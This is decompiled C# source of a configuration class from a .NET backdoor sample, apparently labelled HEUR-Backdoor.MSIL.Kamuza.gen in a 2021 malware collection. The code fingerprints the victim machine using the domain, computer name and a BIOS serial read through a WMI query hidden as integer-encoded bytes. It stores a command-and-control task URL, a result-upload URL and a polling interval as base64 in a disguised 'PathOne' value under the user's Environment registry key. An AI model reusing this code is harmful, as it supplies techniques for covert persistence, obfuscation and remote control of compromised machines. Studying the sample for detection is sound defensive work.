// Decompiled with JetBrains decompiler
// Type: JSS.AppParams
// Assembly: JSS, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CA27710C-27FC-4B6B-9AFB-DB45D81E1E20
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Backdoor.MSIL.Kamuza.gen-dd86898c784342fc11c42bea4c815cb536455ee709e7522fb64622d9171c465d.exe

using Microsoft.Win32;
using System;
using System.Management;
using System.Text;
using System.Text.RegularExpressions;

namespace JSS
{
  internal class AppParams
  {
    private const string RegValueName = "PathOne";
    public static string ProgID;
    public static string URL_GetTask;
    public static string URL_PutAnswer;
    public static int MainInterval;
    public static bool DebugRun = false;
    public static int DebugRunCnt = 1000000;

    public static bool LoadArgs()
    {
      AppParams.ProgID = Environment.GetEnvironmentVariable("UserDomain") + Environment.GetEnvironmentVariable("ComputerName") + AppParams.GetBiosSerial();
      AppParams.ProgID = Regex.Replace(AppParams.ProgID, "[^a-zA-Z0-9]", "");
      try
      {
        string urlGet = "";
        string urlPut = "";
        int theInt = 0;
        AppParams.Unpack((string) Registry.CurrentUser.OpenSubKey("Environment", true).GetValue("PathOne", (object) ""), ref theInt, ref urlGet, ref urlPut);
        AppParams.Set(theInt, urlGet, urlPut);
        return true;
      }
      catch (Exception ex)
      {
        return false;
      }
    }

    public static void SetArguments(string theInt, string uGet, string uPut)
    {
      int val1 = 30;
      try
      {
        val1 = Convert.ToInt32(theInt);
      }
      catch
      {
      }
      string str = AppParams.Pack(Math.Min(Math.Max(val1, 10), 3600), uGet, uPut);
      Registry.CurrentUser.OpenSubKey("Environment", true).SetValue("PathOne", (object) str);
    }

    private static string Pack(int theInterval, string theGetUrl, string thePutUrl) => Convert.ToBase64String(BitConverter.GetBytes(theInterval)) + "." + Convert.ToBase64String(Encoding.ASCII.GetBytes(theGetUrl)) + "." + Convert.ToBase64String(Encoding.ASCII.GetBytes(thePutUrl));

    private static void Unpack(
      string thePars,
      ref int theInt,
      ref string urlGet,
      ref string urlPut)
    {
      string[] strArray = thePars.Split('.');
      theInt = strArray.Length == 3 ? BitConverter.ToInt32(Convert.FromBase64String(strArray[0]), 0) : throw new Exception("1");
      urlGet = Encoding.ASCII.GetString(Convert.FromBase64String(strArray[1]));
      urlPut = Encoding.ASCII.GetString(Convert.FromBase64String(strArray[2]));
    }

    private static void Set(int theInt, string urlPut, string urlGet)
    {
      AppParams.URL_GetTask = urlGet;
      AppParams.URL_PutAnswer = urlPut;
      AppParams.MainInterval = theInt;
    }

    private static string GetBiosSerial()
    {
      string biosSerial = "BIOS UNKNOWN";
      try
      {
        byte[] bytes = AppInfo.Combine(BitConverter.GetBytes(1162626387), BitConverter.GetBytes(1394627651), BitConverter.GetBytes(1634300517), BitConverter.GetBytes(1836404332), BitConverter.GetBytes(544367970), BitConverter.GetBytes(1297044038), BitConverter.GetBytes(1852397344), BitConverter.GetBytes(1113535027), BitConverter.GetBytes(5459785));
        foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher(Encoding.UTF8.GetString(bytes, 0, bytes.Length - 1)).Get())
          biosSerial = (string) managementBaseObject["SerialNumber"];
      }
      catch
      {
      }
      return biosSerial;
    }
  }
}
